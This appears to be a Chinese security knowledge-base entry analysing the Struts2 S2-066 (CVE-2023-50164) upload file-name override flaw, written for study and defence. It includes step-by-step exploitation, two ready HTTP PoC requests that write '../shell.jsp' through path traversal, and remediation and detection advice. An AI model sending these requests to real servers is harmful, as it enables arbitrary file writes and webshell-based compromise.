---
id: web-java-framework-struts2-s2-066-upload-filename-param-override
title: Struts2 S2-066（CVE-2023-50164）：上传文件名参数覆盖导致路径穿越
type: scenario
domain: web
path: web/java/framework/struts2
technique: struts2-upload-filename-param-override
aliases:
- S2-066
- CVE-2023-50164
- Struts2 任意文件上传
- Struts2 上传路径穿越
- uploadFileName 参数覆盖
- Struts2 FileUploadInterceptor 绕过
tags:
- java
- struts2
- file-upload
- path-traversal
- parameter-pollution
- cve-2023-50164
cve:
- CVE-2023-50164
affected_versions: Struts 2.0.0-2.3.37; 2.5.0-2.5.32; 6.0.0-6.3.0
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:13:34+08:00'
  notes: 已对照原文与 img 01-13 核对：FileUploadInterceptor 按 inputName 硬编码生成 <name>FileName、getCanonicalName 按 / 与 \ 截断、ParametersInterceptor 用 TreeMap 排序绑定、uploadFileName 与 UploadFileName 都经 capitalizeBeanPropertyName 映射 setUploadFileName、查询串与 multipart 普通字段两种 PoC 均一致；affected_versions 与原文影响范围完全一致
---

## 一句话结论

Struts2 的 `FileUploadInterceptor` 会把上传框名称硬编码拼接成 `<inputName>FileName` 参数，而 `ParametersInterceptor` 用 `TreeMap` 按 key 的 Unicode 排序后逐条绑定到 Action；攻击者用大写 `Upload` 作为文件框名，再额外提交小写 `uploadFileName`，后者排序在后、会覆盖 Action 中已绑定的安全文件名，从而把 `../` 路径带入业务保存逻辑，实现目录穿越写文件。

## 原理

- 上传请求先经过 `FileUploadInterceptor`：它从 `MultiPartRequestWrapper` 取出文件，并调用 `AbstractMultiPartRequest#getCanonicalName` 处理客户端文件名——按最后一个 `/` 或 `\` 截断，因此直接在上传文件名里写 `../../shell.jsp` 会被削成 `shell.jsp`。
- 随后该拦截器把文件相关参数写入请求参数表，参数名是硬编码拼接的：
  ```java
  String contentTypeName = inputName + "ContentType";
  String fileNameName = inputName + "FileName";
  ```
  例如文件框名为 `upload` 时，生成 `uploadContentType`、`uploadFileName`；若文件框名为 `Upload`，生成的是 `UploadContentType`、`UploadFileName`。
- `ParametersInterceptor#setParameters` 把请求参数放进 `TreeMap`，按 key 的 Unicode 码值升序排列，再逐条调用 `OgnlValueStack#setParameter` 绑定到 Action。关键点有两个：
  1. `TreeMap` 的排序是确定的：`UploadFileName`（首字母 U=85）排在小写 `uploadFileName`（u=117）之前，所以攻击者提交的小写参数后绑定、最终生效。
  2. OGNL 在 `OgnlRuntime#getDeclaredMethods` 中通过 `capitalizeBeanPropertyName` 把属性名首字母大写后查找 setter，`uploadFileName` 与 `UploadFileName` 最终都映射到 `setUploadFileName`。
- 于是业务 Action 里的 `uploadFileName` 字段先被拦截器写入真实文件名，又被攻击者的小写参数覆盖成 `../shell.jsp`。之后 Action 的 `execute()` 若直接用该字段拼接目标路径（如 `new File(uploadDir, uploadFileName)`），就绕过了拦截器对文件名的截断，实现路径穿越。
- 漏洞成立的前提是业务代码信任 `uploadFileName` 属性，而不是使用框架提供的规范化文件名；框架只净化了临时文件名，没有锁定 Action 属性的最终值。

## 触发条件

- 目标使用受影响版本的 Struts2，且启用了默认的 `fileUpload` 与 `params` 拦截器链。
- 存在文件上传 Action，业务代码用 `uploadFileName`（或等价的客户端文件名属性）构造保存路径。
- 攻击者可控制 multipart 文件框名称，并额外提交同名参数（查询串或 multipart 普通字段）。
- 目标进程对写入目录有权限；若目标是 Tomcat 等容器，写入 Web 根目录下的可解析脚本可进一步 RCE。

## 利用步骤

1. 确认 Struts2 版本与上传入口（`.action` 路径、文件框名）。
2. 把文件框名改为大写 `Upload`，使拦截器生成 `UploadFileName`。
3. 同时提交小写 `uploadFileName=../shell.jsp`，该参数在 `TreeMap` 中排在 `UploadFileName` 之后，覆盖 Action 属性。
4. 文件内容按目标业务要求构造（若业务校验 Content-Type/文件头，需一并满足）。
5. 发送请求，观察响应中的保存路径或直接访问写入的文件。
6. 若业务把文件保存到 Web 目录且容器解析 JSP，则获得命令执行；否则可覆盖配置、模板、计划任务等敏感文件。

## PoC

方式一：查询串注入参数，文件框名为大写 `Upload`。

```http
POST /app/upload.action?uploadFileName=../shell.jsp HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="Upload"; filename="1.jpg"
Content-Type: application/octet-stream

<% out.println("EXP"); %>
------WebKitFormBoundaryX--
```

方式二：在 multipart 正文中追加普通文本字段 `uploadFileName`。

```http
POST /app/upload.action HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="Upload"; filename="1.jpg"
Content-Type: application/octet-stream

<% out.println("EXP"); %>
------WebKitFormBoundaryX
Content-Disposition: form-data; name="uploadFileName"
Content-Type: application/octet-stream

../shell.jsp
------WebKitFormBoundaryX--
```

预期：Action 的 `uploadFileName` 最终为 `../shell.jsp`，文件被写到上传目录的上一级；写入位置取决于业务 `execute()` 的路径拼接。

## 变体与关联

- 变体：把 `../` 写成多层（`../../shell.jsp`），深度按业务保存目录确定；Windows 目标可用 `..\`。
- 变体：文件名参数名不一定恰好是 `uploadFileName`，取决于业务域属性；核心是“框架生成的 `<inputName>FileName` 与攻击者同名参数的大小写/排序竞争”。
- 关联：[[web-java-framework-struts2-s2-067-ognl-upload-filename-bypass]]（官方修复大小写去重后，用 OGNL 表达式继续覆盖同一属性）。
- 关联：[[web-generic-file-upload-content-type-trust-bypass]]、[[web-generic-file-upload-magic-byte-gif-prefix-bypass]]（业务侧 Content-Type/魔数校验的绕过）。
- 边界：若业务保存时改用随机文件名、`Path.normalize()` + `startsWith(uploadDir)` 校验，或框架版本已修复，本手法失效。

## 检测与防御

- 修复：升级到官方 S2-066 修复版本；修复后 `HttpParameters#appendAll` 会先按 key 删除同名参数，`remove()` 还把参数名转小写做忽略大小写比较，阻断大小写变体覆盖。
- 代码层：保存文件时不要信任客户端文件名；生成随机文件名，仅保留白名单后缀；对最终路径做 `getCanonicalPath()` 规范化并校验仍位于上传根目录内。
- 配置层：限制上传目录的执行权限，Web 根目录禁止写入脚本；上传文件落到独立静态资源域或对象存储。
- 检测：multipart 请求中出现 `uploadFileName`/`UploadFileName` 与文件框名大小写不一致的组合；查询串里出现 `..` 路径；上传目录外出现新文件、Web 目录出现新 `.jsp`/`.jspx`。
- 加固：对上传 Action 做参数白名单，拒绝业务未声明的参数；开启 Struts2 的参数名接受模式检查并收紧可接受的参数名。
